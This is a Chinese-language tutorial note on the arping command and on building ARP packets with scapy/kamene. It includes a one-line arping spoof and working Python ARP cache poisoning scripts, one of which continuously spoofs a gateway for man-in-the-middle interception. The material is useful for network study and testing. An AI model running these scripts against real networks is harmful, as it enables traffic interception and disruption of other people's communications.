```table-of-contents
```
# 介绍
arping命令是用于发送arp请求到一个相邻主机的工具；使用ARP报文数据包来测试网络状态，能够判断某个指定IP地址是否在网络上已被使用，并能够获取更多设备信息，像是加强版的ping命令。  

# 参数

![](attachments/Pasted%20image%2020240626202915.png)

```bash
-A     The same as -U, but ARP REPLY packets used instead of ARP REQUEST.
		更新邻近主机的ARP缓存（使用ARP应答数据包代替ARP请求数据包）
		
-U     Unsolicited ARP mode to update neighbours' ARP caches.  No replies are expected.


```

# 使用
## 请求mac地址
请求解析192.168.100.70主机的MAC地址
```bash
arping -f 192.168.100.70
```
这将会发送广播报文，直到收到192.168.100.70的回复才退出。

同时，192.168.100.70也会缓存本机的IP和MAC对应条目，由于此处没有指定请求报文的发送接口和源地址，所以发送报文时是根据路由表来选择接口和对应该接口地址的。

## ARP欺骗
```bash
arping -A -I eth1 -s 192.168.100.54 192.168.100.70

```

发送这样的arp请求包，将会使得目标主机192.168.100.70缓存本机的arp条目为”192.168.100.54 MAC_eth1”，但实际上，192.168.100.54所在接口的MAC地址为MAC_eth0。

arping命令仅能实现这种简单的arp欺骗，更多的arp欺骗方法可以使用专门的工具。




# 其他
## scapy构造arp包

由于arping的时候，无法指定mac地址，如果 `-I` 指定的网口被 DPDK程序接管了，那么在linux内核中就无法管理该口；那么就无法指定了，比如 VF 口被DPDK接管。那么此时通过 scapy 进行构造 ARP 响应的欺骗包进行处理。

### arp请求
**先看下ARP包的格式：**
```python
>>> ARP()
<ARP  |>
>>> _.show()
###[ ARP ]###
  hwtype= 0x1
  ptype= 0x800	#协议号
  hwlen= 6
  plen= 4
  op= who-has	#op=1表示Request，op=2表示Response
  hwsrc= 00:0c:29:5d:2f:55	#源MAC地址
  psrc= 192.168.8.128	#源IP地址
  hwdst= 00:00:00:00:00:00	#初始目的为广播地址
  pdst= 0.0.0.0		#缺省为空

```


发送构造的ARP请求包：
```python
#!/usr/bin/env python3
#-*- coding:UTF-8 -*-

import logging

logging.getLogger("kamene.runtime").setLevel(logging.ERROR)  # 清除报错
from kamene.all import *
from Tools.Get_address import get_ip_address  # 获取本机IP地址
from Tools.Get_address import get_mac_address  # 获取本机MAC地址
from Tools.Scapy_iface import scapy_iface  # 获取scapy iface的名字


def arp_request(dst_addr, ifname):
    # 获取本机IP地址
    local_ip = get_ip_address(ifname)
    # 获取本机MAC地址
    local_mac = get_mac_address(ifname)
    try: 
        # 发送ARP请求并等待响应
        #op=1表示请求，op=2表示响应
        #当op=1,hwsrc=表示本地mac，hwdst表示广播(首包)，psrc表示本地IP，pdst表示目的IP
        result_raw = sr1(ARP(op=1,
                             hwsrc=local_mac,
                             hwdst='00:00:00:00:00:00',
                             psrc=local_ip,
                             pdst=dst_addr),
                         iface=scapy_iface(ifname),
                         timeout=1,
                         verbose=False)
        # sr1：在第三层发送数据包,有接收功能，但只接收第一个数据包。
        # 用于哪些判断和目标是否通，接收一个数据包就能判断，没必要接收多个。
        print(result_raw.show())
        #返回目的IP地址，和目的MAC地址，getlayer(ARP)取整个ARP数据包，
        return dst_addr, result_raw.getlayer(ARP).fields.get('hwsrc')

    except AttributeError:
        return dst_addr, None


if __name__ == "__main__":
    # Windows Linux均可使用
    # arp_result = arp_request('192.168.100.1', "WLAN")
    arp_result = arp_request('192.168.8.254', "ens32")
    print("IP地址:", arp_result[0], "MAC地址:", arp_result[1])

```

### arp欺骗

简单实现： 发送arp请求。
```python

from scapy.all import *
import time

#构造包
#pdst是目标IP，psrc是网关的ip
p1=Ether(dst="ff:ff:ff:ff:ff:ff",src="b8:81:98:e0:46:6a")/ARP(pdst="192.168.43.250",psrc="192.168.43.1")
for i in range(6000):
    sendp(p1, iface="wan")
    time.sleep(0.1)
```


复杂实现：
```python
#!/usr/bin/env python3
#-*- coding:UTF-8 -*-


import logging
logging.getLogger("kamene.runtime").setLevel(logging.ERROR)  # 清除报错

from kamene.all import *
from Tools.Get_address import get_ip_address  # 导入获取本机IP地址方法
from Tools.Get_address import get_mac_address  # 导入获取本机MAC地址方法
from ARP_Request import arp_request  # 导入之前创建的ARP请求脚本
from Tools.Scapy_iface import scapy_iface  # 获取scapy iface的名字
import time
import signal


def arp_spoof(ip_1,ip_2,ifname='ens35'):
    # 申明全局变量
    global localip, localmac, dst_1_ip , dst_1_mac, dst_2_ip , dst_2_mac , local_ifname

    #赋值到全局变量
    #dst_1_ip为被毒化ARP设备的IP地址，dst_ip_2为本机伪装设备的IP地址
    #local_ifname为攻击者使用的网口名字
    dst_1_ip, dst_2_ip, local_ifname= ip_1, ip_2, ifname

    # 获取本机IP和MAC地址，并且赋值到全局变量
    localip, localmac= get_ip_address(ifname), get_mac_address(ifname)

    # 获取被欺骗ip_1的MAC地址，真实网关ip_2的MAC地址
    dst_1_mac, dst_2_mac = arp_request(ip_1,ifname)[1], arp_request(ip_2,ifname)[1]

    # 引入信号处理机制，如果出现ctl+c（signal.SIGINT），使用sigint_handler这个方法进行处理
    signal.signal(signal.SIGINT, sigint_handler)

    while True:  # 一直攻击，直到ctl+c出现！！！
        # op=2,响应ARP
        sendp(Ether(src=localmac, dst=dst_1_mac) / ARP(op=2, hwsrc=localmac, hwdst=dst_1_mac, psrc=dst_2_ip, pdst=dst_1_ip),
              iface=scapy_iface(local_ifname),
              verbose=False)

        print("发送ARP欺骗数据包！欺骗{} , {}的MAC地址已经是我本机{}的MAC地址啦!!!".format(ip_1,ip_2,ifname))
        time.sleep(1)


# 定义处理方法
def sigint_handler(signum, frame):
    # 申明全局变量
    global localip, localmac, dst_1_ip , dst_1_mac, dst_2_ip , dst_2_mac , local_ifname

    print("\n执行恢复操作！！！")
    # 发送ARP数据包，恢复被毒化设备的ARP缓存
    sendp(Ether(src=dst_2_mac, dst=dst_1_mac) / ARP(op=2, hwsrc=dst_2_mac, hwdst=dst_1_mac, psrc=dst_2_ip, pdst=dst_1_ip),
          iface=scapy_iface(local_ifname),
          verbose=False)
    print("已经恢复 {} 的ARP缓存啦".format(dst_1_ip))
    # 退出程序，跳出while True
    sys.exit()

if __name__ == "__main__":
    # 欺骗192.168.1.101,让它认为192.168.1.102的MAC地址为本机攻击者的MAC
    #如果攻击者没有路由通信就会中断，如有路由就可以窃取双方通信的信息(所谓中间人)
    arp_spoof('192.168.1.101' , '192.168.1.102' , 'ens35')

```





# 参考
```bash

scapy构造ARP
https://juejin.cn/post/6844903955026165768

```